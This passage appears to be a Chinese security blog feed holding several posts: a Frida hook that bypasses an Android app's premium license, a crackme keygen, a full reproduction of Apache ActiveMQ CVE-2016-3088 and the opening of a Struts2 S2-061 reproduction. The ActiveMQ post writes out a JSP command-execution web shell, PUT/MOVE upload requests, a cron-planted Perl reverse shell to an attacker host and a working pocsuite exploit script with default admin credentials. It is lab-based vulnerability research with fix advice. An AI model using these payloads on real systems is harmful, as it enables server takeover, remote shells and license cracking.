+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static byte[] xor(byte[] val, byte[] key) &#123;</span><br><span class="line">    byte[] o &#x3D; new byte[val.length];</span><br><span class="line">    for (int i &#x3D; 0; i &lt; val.length; i++) &#123;</span><br><span class="line">        o[i] &#x3D; (byte) (val[i] ^ key[i % key.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来当程序被激活成功后，点击<code>PREMIUM CONETNT</code>按钮，会调用<code>MainActivity</code>中的方法，可以看到它将MAC，以及生成的Key发送到了<code>MainActivity</code>中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void showPremium(View view) &#123;</span><br><span class="line">       Intent i &#x3D; new Intent(this, MainActivity.class);</span><br><span class="line">       i.putExtra(&quot;MAC&quot;, getMac());</span><br><span class="line">       i.putExtra(&quot;KEY&quot;, getKey());</span><br><span class="line">       startActivity(i);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>MainActivity</code>的<code>onCreate</code>方法中，看到了最终答案生成的native方法<code>stringFromJNI(key, mac)</code>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"> &#x2F;&#x2F;获取Intent传递过来的值</span><br><span class="line">        String key &#x3D; getIntent().getStringExtra(&quot;KEY&quot;);</span><br><span class="line">        String mac &#x3D; getIntent().getStringExtra(&quot;MAC&quot;);</span><br><span class="line">        if (key &#x3D;&#x3D; &quot;&quot; || mac &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            key &#x3D; &quot;&quot;;</span><br><span class="line">            mac &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((int) R.layout.activity_main);</span><br><span class="line">     &#x2F;&#x2F;调用native函数，算出答案</span><br><span class="line">        ((TextView) findViewById(R.id.sample_text)).setText(stringFromJNI(key, mac));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概过程如下：</p>
+<ol>
+<li>输入License，进行验证</li>
+<li>通过网络验证获取返回值“LICENSEKEYOK”后，然后调用<code>MainActivity.xor</code>在本地<code>preferences</code>文件中生成秘钥，激活成功。</li>
+<li>本地获取MAC地址及秘钥Key传入<code>MainActivity</code>得出答案。</li>
+</ol>
+<h3 id="对hook点进行分析"><a href="#对hook点进行分析" class="headerlink" title="对hook点进行分析"></a>对hook点进行分析</h3><ol>
+<li>获取getMac()函数的返回值，与“LICENSEKEYOK”字符串进行xor运算得出秘钥Key.</li>
+<li>hook getKey方法，让它不从<code>preferences</code>文件读取Key,而是我们自己构造。</li>
+<li>hook <code>verifyClick</code>,让它调用<code>showPremium</code>方法</li>
+</ol>
+<h3 id="代码的构造与编写"><a href="#代码的构造与编写" class="headerlink" title="代码的构造与编写"></a>代码的构造与编写</h3><h4 id="hook-getMac-函数"><a href="#hook-getMac-函数" class="headerlink" title="hook getMac()函数"></a>hook getMac()函数</h4><p>getMac() 在showPremium函数中调用，showPremium在LauncherActivity类中，所有直接通过this就能直接调用getMac()方法</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">js_code = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var hook_Activity = Java.use(&#x27;</span>de.fraunhofer.sit.premiumapp.LauncherActivity<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        hook_Activity.showPremium.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">            var Key = this.getKey();</span></span><br><span class="line"><span class="string">            var Mac = this.getMac();</span></span><br><span class="line"><span class="string">            send(Key);</span></span><br><span class="line"><span class="string">            send(Mac);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>完整的Python代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hook_Activity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);</span><br><span class="line">        hook_Activity.showPremium.implementation &#x3D; function(v)&#123;</span><br><span class="line">            var Key &#x3D; this.getKey();</span><br><span class="line">            var Mac &#x3D; this.getMac();</span><br><span class="line">            send(Key);</span><br><span class="line">            send(Mac);</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)</span><br><span class="line">script &#x3D; process.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217210711185.png" alt="image-20201217210711185"></p>
+<p>更新中…</p>
+]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Frida</tag>
+        <tag>Hook</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>crackme 系列之 crackme1</title>
+    <url>/2020/12/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme1/</url>
+    <content><![CDATA[<h2 id="首先打开程序进行查看"><a href="#首先打开程序进行查看" class="headerlink" title="首先打开程序进行查看"></a>首先打开程序进行查看</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211408617.png" alt="image-20201217211408617" style="zoom:50%;">
+
+<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211534773.png" alt="image-20201217211534773" style="zoom:50%;">
+
+<p>发现无壳</p>
+<h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211703604.png" alt="image-20201217211703604" style="zoom:50%;">
+
+<p>账户密码认证 直接仍进去OD进行分析 搜索关键字</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211729398.png" alt="image-20201217211729398"></p>
+<p>在函数⼊⼝处下断点然后运⾏跟踪</p>
+<p>输⼊11111 11111</p>
+<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211749736.png" alt="image-20201217211749736" style="zoom:50%;">
+
+<p>发现关键call 和对比进入分析</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211829649.png" alt="image-20201217211829649"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211843007.png" alt="image-20201217211843007"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211852605.png" alt="image-20201217211852605"></p>
+<p>⽤户 11111</p>
+<p>堆栈 ss:[0019F664]=0241D6A8, (ASCII “CW-4018-CRACKED”)</p>
+<p>eax=00000005</p>
+<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211930837.png" alt="image-20201217211930837" style="zoom:50%;">
+
+<p>输⼊后成功破解</p>
+<h2 id="对算法进行相应的破解"><a href="#对算法进行相应的破解" class="headerlink" title="对算法进行相应的破解"></a>对算法进行相应的破解</h2><p>下断点 输⼊ 11111 22222</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212049762.png" alt="image-20201217212049762"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212101828.png" alt="image-20201217212101828"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212112333.png" alt="image-20201217212112333"></p>
+<p>发现有两次-的拼接</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212144262.png" alt="image-20201217212144262"></p>
+<p>CW-xxxx-CRACKED</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212206907.png" alt="image-20201217212206907"></p>
+<p>这⾥为取第⼀⼀位 ascii码值的16进制 31 x 0x29</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212244191.png" alt="image-20201217212244191"></p>
+<p>相乘之后为 0x7d9</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212316214.png" alt="image-20201217212316214"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212401486.png" alt="image-20201217212401486"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212426807.png" alt="image-20201217212426807"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212446924.png" alt="image-20201217212446924"></p>
+<p>⾃身x2</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212513125.png" alt="image-20201217212513125"></p>
+<p>之后转10进制即可</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212548980.png" alt="image-20201217212548980"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212606569.png" alt="image-20201217212606569"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212619373.png" alt="image-20201217212619373"></p>
+<p>接下来是字符拼接</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212647428.png" alt="image-20201217212647428"></p>
+<p>根据push关系可以推断出此处注册码为：</p>
+<p>CW-4018-CRACKED</p>
+<p>#####</p>
+<p>算法脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c &#x3D; input(&quot;please input a str\n&quot;)</span><br><span class="line">temp&#x3D;eval(hex(eval(hex(ord(c[0])))*eval(&#39;0x29&#39;)*eval(&#39;0x2&#39;))) </span><br><span class="line">flag &#x3D; &quot;CW-&quot; + str(temp) + &quot;-CRACKED&quot;</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212906861.png" alt="image-20201217212906861"></p>
+]]></content>
+      <categories>
+        <category>Re</category>
+      </categories>
+      <tags>
+        <tag>crackme</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ActiveMQ漏洞复现分析以及POC(CVE-2016-3088)</title>
+    <url>/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/</url>
+    <content><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：Apache ActiveMQ 5.x ~ 5.14.0</p>
+<p> ActiveMQ在5.12.x~5.13.x默认关闭fileserver应用</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录,下载 <a href="http://archive.apache.org/dist/activemq/apache-activemq/5.7.0/activemq-parent-5.7.0-source-release.zip">ActiveMQ 5.7.0 源码</a> ，可以看到后台处理 PUT 的关键代码如下</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154823813.png" alt="image-20201217154823813"></p>
+<p>用户可以上传文件到指定目录，该路径在 <code>conf/jetty.xml</code> 中定义，如下</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p>
+<p>顺着 PUT 方法追踪，可以看到调用了如下函数</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155145859.png" alt="image-20201217155145859"></p>
+<p>同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155615911.png" alt="image-20201217155615911"></p>
+<p>由此，我们可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="1-上传webshell"><a href="#1-上传webshell" class="headerlink" title="1.上传webshell"></a>1.上传webshell</h3><p>可以爆破目录(未复现成功)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;test&#x2F;123&#x2F;123 HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 4</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+
+<p>admin 登陆查看目录</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151345913.png" alt="image-20201217151345913"></p>
+<p>首先 PUT 一个  Webshell 的txt到 fileserver 目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line&#x3D;null;</span><br><span class="line"> Process p&#x3D;Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line"> while((line&#x3D;br.readLine())!&#x3D;null)&#123;</span><br><span class="line">  out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151116478.png" alt="image-20201217151116478"></p>
+<p>查看发现上传成功</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152139322.png" alt="image-20201217152139322"></p>
+<p>由于上传的是文本文件并不能被服务器解析，所以我们下一步要利用MOVE方法将上传的webshell移动到可以执行的目录并更改后缀为jsp。</p>
+<p>可以解析jsp文件的路径有：</p>
+<p>1．/opt/activemq/webapps/api</p>
+<p>2．/opt/activemq/webapps/admin</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;node016s6o5xkj6jyp130d905yk3j4l1.node0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个坑，困惑了我很久，我的方法步骤都没有问题为什么MOVE方法会一直响应超时并且得不到任何响应的内容。尝试了很久，我一度怀疑我的</p>
+<p>vulhub环境有问题，一次偶然中我用burp抓到的包去修改执行MOVE方法很快就得到了响应结果，神奇的是把这个数据包重新复制到repeater执行再次出现</p>
+<p>响应超时的结果，明明是两个相同的数据包，真是令人费解，有的时候在正常渗透测试过程也会发现这个情况，根据xssle师傅分析可能是MOVE方法不稳定导致的</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152440918.png" alt="image-20201217152440918"></p>
+<p>然后访问即可</p>
+<p><a href="http://172.20.10.3:8161/api/1.jsp?cmd=ls">http://172.20.10.3:8161/api/1.jsp?cmd=ls</a></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152645064.png" alt="image-20201217152645064"></p>
+<h3 id="2-计划任务反弹"><a href="#2-计划任务反弹" class="headerlink" title="2.计划任务反弹"></a>2.计划任务反弹</h3><p>写入反弹计划命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>移动到/etc/cron.d/目录下，遇到ubuntu目录不太一样，参考<a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/">这里</a></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153434585.png" alt="image-20201217153434585"></p>
+<h3 id="3-写入ssh密钥"><a href="#3-写入ssh密钥" class="headerlink" title="3.写入ssh密钥"></a>3.写入ssh密钥</h3><p>docker未安装ssh未复现，可参考<a href="https://www.secpulse.com/archives/60064.html">这里</a></p>
+<h3 id="Metasploit-反弹shell"><a href="#Metasploit-反弹shell" class="headerlink" title="Metasploit 反弹shell"></a>Metasploit 反弹shell</h3><p>进入metasploit，搜索2016-3088</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153915502.png" alt="image-20201217153915502"></p>
+<p>直接淦就完事了</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154031247.png" alt="image-20201217154031247"></p>
+<h2 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h2><p>根据漏洞的原理进行编写    验证模块PUT成功即可  攻击模块进行MOVE操作</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase,Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line">class ActiveMQPoc(POCBase):</span><br><span class="line">	vulID &#x3D; &#39;002&#39;</span><br><span class="line">	version &#x3D; &#39;1.0&#39;</span><br><span class="line">	author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">	vulDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">	updateDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">	references &#x3D; [&#39;https:&#x2F;&#x2F;paper.seebug.org&#x2F;346&#x2F;&#39;]</span><br><span class="line">	name &#x3D; &#39;Apache ActiveMQ (CVE-2016-3088)&#39;</span><br><span class="line">	appPowerLink &#x3D; &#39;activemq.apache.org&#39;</span><br><span class="line">	appName &#x3D; &#39;Apache activemq&#39;</span><br><span class="line">	appVersion &#x3D; &#39; Apache ActiveMQ 5.14.0&#39;</span><br><span class="line">	vulType &#x3D; &#39;Arbitrary File Reading&#39;</span><br><span class="line">	desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 			fileserverfileserverjsp\</span><br><span class="line"> 			MOVEMOVE</span><br><span class="line"> 			&#39;&#39;&#39;</span><br><span class="line">	pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 	pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> 	&#39;&#39;&#39;</span><br><span class="line">	samples &#x3D; []</span><br><span class="line">	install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line">	def _verify(self):</span><br><span class="line"> 		result &#x3D; &#123;&#125;</span><br><span class="line"> 		path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line"> 		path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;ls&quot;</span><br><span class="line"> 		url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line"> 		try:</span><br><span class="line"> 			resp &#x3D; req.put(url)</span><br><span class="line"> 			resp1 &#x3D; req.get(url)</span><br><span class="line"> 			if (resp.status_code &#x3D;&#x3D; 204 and str(resp1.status_code)[0] in (&#39;2&#39;, &#39;3&#39;)):</span><br><span class="line"> 				result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line"> 				result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line"></span><br><span class="line"> 		except Exception as ex:</span><br><span class="line"> 			pass</span><br><span class="line"></span><br><span class="line"> 		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">	def parse_output(self, result):</span><br><span class="line"> 		output &#x3D; Output(self)</span><br><span class="line"> 		if result:</span><br><span class="line"> 			output.success(result)</span><br><span class="line"> 		else:</span><br><span class="line"> 			output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> 		return output</span><br><span class="line"></span><br><span class="line">	def _attack(self):</span><br><span class="line">		result &#x3D; &#123;&#125;</span><br><span class="line">		path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line">		path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;id&quot;</span><br><span class="line">		url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line">		url1 &#x3D; self.url + &#39;&#x2F;&#39; + path1</span><br><span class="line">		data1 &#x3D; &#39;1&#39;</span><br><span class="line">		data &#x3D; &#39;&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);String line&#x3D;null;Process p&#x3D;Runtime.getRuntime().exec(strcmd);BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));while((line&#x3D;br.readLine())!&#x3D;null)&#123;out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);&#125;%&gt;&#39;</span><br><span class="line"></span><br><span class="line">		headers &#x3D;&#123;</span><br><span class="line"> 		&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		headers1&#x3D;&#123;</span><br><span class="line">		&#39;Authorization&#39;:&#39;Basic YWRtaW46YWRtaW4&#x3D;&#39;,</span><br><span class="line">		&#39;Connection&#39;:&#39;close&#39;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		proxies&#x3D;&#123;</span><br><span class="line">		&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">		&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		try:</span><br><span class="line">			resp &#x3D; req.put(url,data&#x3D;data)</span><br><span class="line">			resp1 &#x3D; req.get(url)</span><br><span class="line">			resp2 &#x3D; req.request(&#39;MOVE&#39;,url&#x3D;url,headers&#x3D;&#123;&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;2.jsp&#39;&#125;)</span><br><span class="line">			resp3 &#x3D; req.get(url1,headers&#x3D;headers1)</span><br><span class="line">			resp3 &#x3D; resp3.text[12:50]</span><br><span class="line">			result[&#39;AdminInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">			result[&#39;AdminInfo&#39;][&#39;SHELL&#39;] &#x3D; url1</span><br><span class="line">			result[&#39;AdminInfo&#39;][&#39;EXEC &#39;] &#x3D; resp3</span><br><span class="line">		except Exception as ex:</span><br><span class="line">			pass</span><br><span class="line"></span><br><span class="line">		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">register(ActiveMQPoc)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217173751874.png" alt="image-20201217173751874"></p>
+<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p>
+<p>2、通过移除 <code>conf\jetty.xml</code> 的以下配置来禁用 ActiveMQ Fileserver 功能</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/346/">https://paper.seebug.org/346/</a></p>
+<p><a href="http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/">http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/</a></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>ActiveMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 S2-061 远程命令执行漏洞(CVE-2020-17530)复现以及脚本编写</title>
+    <url>/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts2：2.0.0 - 2.5.25</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-061</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">e60ea5e361ff        vulhub&#x2F;struts2:2.5.25   &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;mvn-…&quot;   34 minutes ago      Up 34 minutes       0.0.0.0:8080-&gt;8080&#x2F;tcp   s2-061_struts2_1</span><br></pre></td></tr></table></figure>
+
+<h4 id="访问漏洞环境"><a href="#访问漏洞环境" class="headerlink" title="访问漏洞环境"></a>访问漏洞环境</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194045330.png" alt="image-20201216194045330"></p>
+<h4 id="测试漏洞是否存在"><a href="#测试漏洞是否存在" class="headerlink" title="测试漏洞是否存在"></a>测试漏洞是否存在</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194318514.png" alt="image-20201216194318514"></p>
